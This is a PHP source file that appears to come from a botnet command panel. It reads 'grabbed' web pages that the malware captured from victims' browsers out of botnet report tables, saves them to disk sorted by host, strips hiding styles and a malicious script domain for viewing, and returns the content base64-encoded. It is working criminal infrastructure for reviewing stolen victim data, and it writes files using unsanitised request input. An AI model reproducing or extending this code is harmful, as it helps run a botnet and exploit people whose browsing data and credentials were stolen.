<?php 

error_reporting(0);
ini_set("display_errors", false);
ini_set("log_errors", false);
/**/
define('__CP__', 1);
if(!@include_once('jr_new_config.php'))die('Hello! How are you?');
require_once($config['system_path'].'/global.php');

if(!connectToDb())die(mysqlErrorEx());

$tbl = 'botnet_reports_'.(int)$_GET['t'];
    $r = mysqlQueryEx($tbl, "SELECT context FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
    if(!$r)ThemeMySQLError();
    if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
	
	$lines = explode("\n",$m[0]);
	$title = trim($lines[0]);
	
	//save the html page to folder
	if (isset($_GET['save']) && $_GET['save']=="1"){
		if (substr($title,0,strlen("Grabbed data from:"))=="Grabbed data from:"){
			$title = trim(substr($title,strlen("Grabbed data from:"),strlen($title)));
		}
		$url = parse_url($title);
		
		if (!is_dir("jr_html_pages")){mkdir("jr_html_pages");}
		if (!is_dir("jr_html_pages/".$url['host'])){mkdir("jr_html_pages/".$url['host']);}
		
		$file = fopen("jr_html_pages/".$url['host']."/".(int)$_GET['t']."_".$_GET['id'].".html","w");
		fwrite($file,$m[0]);
		fclose($file);
		
		//write to a text file also ?
		echo (int)$_GET['t']."_".$_GET['id'].".html";
		
		
		exit;
	
	}
	
	
	
	
	foreach ($lines as $k=>$v){
		if (trim($v=="")) unset($lines[$k]);
	}
	
	$lines = array_values($lines);
	
	if ($_GET['noscript']=="1") {	
		$lines = str_replace(array("<script ","/script"),array("<noscript ","/noscript"),$lines );
	}
	$lines = str_replace(array("display:none","js.smtsc.co.cc"),array("","localhost"),$lines );
	
	if ($_GET['ajax']=="1"){
		
		if ($_GET['type']=="text"){
		$lines[1] .="\r\n";
		$lines[2] .="\r\n";
			$lines = implode("\n",$lines);
			$lines = '<p style="font-family: Verdana, Helvetica, sans-serif; font-size: 10px;">'.urldecode(nl2br($lines)).'</p>';
		}else{
			unset($lines[0],$lines[1]);
			$lines = implode("\n",$lines);
		}
		echo base64_encode($lines);
		//echo base64_encode("1");
		
		exit; 
	}
?>  